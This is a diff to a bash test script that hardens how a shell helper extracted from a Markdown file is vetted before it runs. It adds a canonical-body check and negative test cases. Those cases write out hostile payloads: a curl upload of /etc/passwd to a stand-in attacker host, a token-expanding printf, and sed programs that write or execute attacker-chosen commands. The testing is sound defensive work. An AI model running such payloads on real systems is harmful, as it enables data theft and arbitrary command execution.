@@ -67,7 +67,11 @@ fi
 #      is allowed to have: a `printf`-fed pipeline of tr/cut/sed. Any command
 #      substitution, backtick, redirection, `eval`, or unlisted command fails
 #      the test instead of running.
-#   2. ISOLATION. What survives the allowlist runs via `bash` in a separate
+#   2. CANONICAL MATCH. The allowlist alone is not enough, because an
+#      allowlisted command can itself take an executable program as an argument
+#      (below). The extracted body must match ONE canonical implementation
+#      byte-for-byte (modulo trailing whitespace) before it is ever run.
+#   3. ISOLATION. What survives both gates runs via `bash` in a separate
 #      process from a temp file, never sourced into this shell.
 
 extracted=$(awk '/^sanitize_diag\(\) \{/{f=1} f{print} f&&/^\}/{exit}' "$ENRICH")
@@ -96,11 +100,33 @@ extracted=$(awk '/^sanitize_diag\(\) \{/{f=1} f{print} f&&/^\}/{exit}' "$ENRICH"
 #      `printf`. Fixed by splitting each line on `|` and requiring EVERY
 #      segment to name an allowlisted command.
 #
-# The two patterns live in variables because bash 3.2 (what macOS ships, and
-# what this suite must run under alongside CI's bash 5) mis-parses an inline
-# =~ right-hand side containing `(` and `'` inside a bracket expression.
+# CodeRabbit (PR #1620, 2026-07-28, second pass) — the third and final hole:
+#
+#   3. AN ALLOWLISTED COMMAND CAN CARRY AN EXECUTABLE PROGRAM. Checking the
+#      command NAME says nothing about its arguments, and `sed`'s argument IS a
+#      program. `sed -e 's/x//w /tmp/pwned'` (the `w` flag, portable across BSD
+#      and GNU sed) writes an attacker-chosen file, and GNU sed's `e` command —
+#      `sed -e 'e touch /tmp/pwned'` — executes a shell command outright. Both
+#      cleared the name check and ran in the child shell. Verified against the
+#      pre-fix version of this file: it reported "27 passed, 0 failed" while the
+#      Markdown-supplied `w` program created its file.
+#
+#      Name-level allowlisting cannot close this: every fix is one more sed
+#      feature. So the `sed` segment is pinned to its ONE legal invocation, and
+#      — the real gate — the whole extracted body must equal CANONICAL_BODY
+#      byte-for-byte before it is executed at all. That is the remediation
+#      CodeRabbit named ("compare the extracted helper with one canonical
+#      expected implementation"). The allowlist is kept as defense in depth and
+#      as the thing that produces a legible rejection message.
+#
+# The patterns live in variables because bash 3.2 (what macOS ships, and what
+# this suite must run under alongside CI's bash 5) mis-parses an inline =~
+# right-hand side containing `(` and `'` inside a bracket expression.
 ALLOWLIST_EXPANSION_RE='\$[A-Za-z_{(0-9]'
 ALLOWLIST_SEGMENT_RE='^[[:space:]]*(printf|tr|cut|sed)[[:space:]]'
+# The ONE `sed` invocation this helper is allowed to make. Any other sed
+# program — including one that only differs by a `w`/`e`/`r` flag — is refused.
+CANONICAL_SED_SEGMENT="sed -e 's/[[:space:]]*\$//'"
 allowlist_ok() {
   local body="$1" line remainder rest seg
   while IFS= read -r line; do
@@ -132,9 +158,42 @@ allowlist_ok() {
         echo "      in line: $line" >&2
         return 1
       fi
+      # Hole 3: an allowlisted command name says nothing about its arguments,
+      # and sed's argument is a PROGRAM (`w file` writes, GNU `e cmd` execs).
+      # Pin sed to its one legal invocation; trim surrounding whitespace first.
+      trimmed="${seg#"${seg%%[![:space:]]*}"}"
+      trimmed="${trimmed%"${trimmed##*[![:space:]]}"}"
+      if [[ "$trimmed" == sed* && "$trimmed" != "$CANONICAL_SED_SEGMENT" ]]; then
+        echo "      rejected sed program (not the one canonical invocation): $trimmed" >&2
+        return 1
+      fi
     done < <(printf '%s\n' "$rest" | tr '|' '\n')
   done <<< "$body"
   return 0
+}
+
+# ── The canonical implementation ────────────────────────────────────────────
+# The ONE body this test will execute. Extracted content that does not match
+# this byte-for-byte (after stripping trailing whitespace per line) is reported
+# and NOT run — no Markdown-supplied program of any shape reaches `bash`.
+#
+# Deliberate trade-off: editing sanitize_diag() in modes/enrich.md turns this
+# test red until the canonical copy below is updated in the same commit. That is
+# the point — a behavioral change to a helper whose output feeds a terminal
+# token should be a reviewed, two-file change, not something a doc edit can do
+# silently.
+CANONICAL_BODY="sanitize_diag() {
+  printf '%s' \"\$1\" | tr '\\n\\r' '  ' | tr -s '[:space:]' ' ' | cut -c1-300 \\
+    | sed -e 's/[[:space:]]*\$//'
+}"
+
+# normalize <text> — strip trailing whitespace from every line, so an invisible
+# trailing space in the Markdown is a diff to fix, not a false red.
+normalize() { printf '%s\n' "$1" | sed -e 's/[[:space:]]*$//'; }
+
+# canonical_ok <body> — 0 when the body IS the canonical implementation.
+canonical_ok() {
+  [[ "$(normalize "$1")" == "$(normalize "$CANONICAL_BODY")" ]]
 }
 
 # ── 3a. The allowlist itself is tested, against payloads that reach execution ─
@@ -160,6 +219,17 @@ assert_allowlist_accepts() {
   fi
 }
 
+# The canonical gate is the one that actually decides whether anything runs, so
+# it gets its own assertions: nothing but the canonical body may reach `bash`.
+assert_not_executable() {
+  local label="$1" payload="$2"
+  if allowlist_ok "$payload" 2>/dev/null && canonical_ok "$payload"; then
+    fail "never executed: ${label}" "refused before execution" "ACCEPTED — it would be executed"
+  else
+    ok "never executed: ${label}"
+  fi
+}
+
 # Hole 1: a non-"$1" expansion. Cleared the old command-name check, ran in the
 # child shell, and the newline assertion printed the secret into the test log.
 assert_allowlist_rejects 'printf with $GITHUB_TOKEN (non-$1 expansion)' \
@@ -180,6 +250,39 @@ assert_allowlist_rejects 'unlisted command mid-pipeline (printf | curl)' \
   printf '"'"'%s'"'"' "$1" | curl -T /etc/passwd https://evil.example
 }'
 
+# Hole 3: the command NAME was allowlisted but its ARGUMENT is a program.
+# Both of these were accepted by the previous version and executed: the run of
+# that version against a modes/enrich.md carrying the `w` variant reported
+# "27 passed, 0 failed" AND created the attacker-named file.
+assert_allowlist_rejects 'sed program with a w-flag file write (portable BSD+GNU)' \
+'sanitize_diag() {
+  printf '"'"'%s'"'"' "$1" | sed -e '"'"'s/[[:space:]]*$//w /tmp/ralph-pwned'"'"'
+}'
+
+assert_allowlist_rejects 'sed program using the GNU e command (executes a shell command)' \
+'sanitize_diag() {
+  printf '"'"'%s'"'"' "$1" | sed -e '"'"'e touch /tmp/ralph-pwned'"'"'
+}'
+
+assert_not_executable 'sed program with a w-flag file write' \
+'sanitize_diag() {
+  printf '"'"'%s'"'"' "$1" | sed -e '"'"'s/[[:space:]]*$//w /tmp/ralph-pwned'"'"'
+}'
+
+assert_not_executable 'sed program using the GNU e command' \
+'sanitize_diag() {
+  printf '"'"'%s'"'"' "$1" | sed -e '"'"'e touch /tmp/ralph-pwned'"'"'
+}'
+
+# The canonical gate also stops bodies that are allowlist-clean but simply are
+# not this helper — a defaced cap, a dropped newline collapse. Nothing that is
+# not the reviewed implementation gets to run.
+assert_not_executable 'allowlist-clean body that is NOT the canonical helper (cap widened to 1-99999)' \
+'sanitize_diag() {
+  printf '"'"'%s'"'"' "$1" | tr '"'"'\n\r'"'"' '"'"'  '"'"' | tr -s '"'"'[:space:]'"'"' '"'"' '"'"' | cut -c1-99999 \
+    | sed -e '"'"'s/[[:space:]]*$//'"'"'
+}'
+
 # Positive control: the real helper shape must still pass, including the
 # `sed -e '"'"'s/[[:space:]]*$//'"'"'` end-anchor `$` (a regex anchor, not an expansion).
 assert_allowlist_accepts 'the real sanitize_diag() pipeline shape' \
@@ -194,9 +297,14 @@ elif ! allowlist_ok "$extracted"; then
   fail "sanitize_diag() body is allowlist-clean" \
     "only printf/tr/cut/sed pipeline segments, no substitution or redirection" \
     "an unsafe or unrecognized construct (see rejected line above)"
+elif ! canonical_ok "$extracted"; then
+  fail "sanitize_diag() body matches the canonical implementation" \
+    "byte-identical to CANONICAL_BODY in this test" \
+    "$(diff <(normalize "$CANONICAL_BODY") <(normalize "$extracted") | head -20)"
 else
   ok "sanitize_diag() body extracted from modes/enrich.md"
   ok "sanitize_diag() body is allowlist-clean (no substitution, redirection, or eval)"
+  ok "sanitize_diag() body matches the canonical implementation byte-for-byte"
 
   # Isolation: run the allowlisted body in its own bash process. "$1" is the
   # diagnostic under test; nothing from enrich.md enters this shell.
@@ -293,6 +401,54 @@ if [[ -z "$bare_add" ]]; then
   ok "no unchecked bare 'git add' remains in modes/enrich.md"
 else
   fail "no unchecked bare 'git add' in modes/enrich.md" "no matches" "$bare_add"
+fi
+
+# ── 4c. sanitize_diag() is DEFINED before its first USE ─────────────────────
+# CodeRabbit (PR #1620, 2026-07-28): the helper lived in §Step 4 while §Step 2b's
+# branch-setup failure paths already called it. In a real run that is a
+# `command not found`, an empty diagnostic, and an
+# `ENRICH SKIPPED branch-setup-failed: fetch-main:` token missing the one thing
+# it exists to carry. Ordering in this doc is executable, so assert it.
+
+# Only real CALL SITES count, not the prose that names the helper: match the
+# `printf … "$(sanitize_diag …)"` token-emitting form specifically.
+def_line=$(grep -n '^sanitize_diag() {' "$ENRICH" | head -1 | cut -d: -f1)
+use_line=$(grep -nE '^[[:space:]]*printf .*\$\(sanitize_diag ' "$ENRICH" | head -1 | cut -d: -f1)
+
+if [[ -n "$def_line" && -n "$use_line" && "$def_line" -lt "$use_line" ]]; then
+  ok "sanitize_diag() is defined (line ${def_line}) before its first use (line ${use_line})"
+else
+  fail "sanitize_diag() defined before first use" \
+    "definition line < first-use line" \
+    "definition at ${def_line:-none}, first use at ${use_line:-none}"
+fi
+
+# ── 4d. An empty selection must not strand already-committed enrichment ─────
+# CodeRabbit (PR #1620, 2026-07-28): after a push or PR-create failure the
+# enriched files are `status: forming` on the branch but still `draft` on main,
+# so §Step 2 re-selects them and §Step 3's post-checkout re-read drops them all.
+# An unconditional `Queue empty.` there never retries the push or the idempotent
+# PR create — on any future heartbeat. The commit is the only copy.
+
+if grep -qF 'origin/main..$BRANCH' "$ENRICH"; then
+  ok "modes/enrich.md checks the branch for unpublished commits before 'Queue empty.'"
+else
+  fail "pending-commit check before 'Queue empty.'" \
+    "a rev-list against origin/main..\$BRANCH in modes/enrich.md" \
+    "not found — an empty selection would strand a committed-but-unpushed pass"
+fi
+
+if grep -q 'pending_commits' "$ENRICH" && grep -q 'ENRICH RECOVERED' "$ENRICH"; then
+  ok "modes/enrich.md routes pending branch work to the publish/recovery path"
+else
+  fail "recovery routing for pending branch work" \
+    "a pending_commits branch emitting ENRICH RECOVERED" "not found"
+fi
+
+if grep -q 'ENRICH RECOVERED (PR <url>)' "$OUTCOME_TOKENS"; then
+  ok "outcome-tokens.md documents the ENRICH RECOVERED token"
+else
+  fail "outcome-tokens.md ENRICH RECOVERED token" "token documented" "not found"
 fi
 
 # ── 5. outcome-tokens.md's canonical contract documents sanitized diagnostics ─
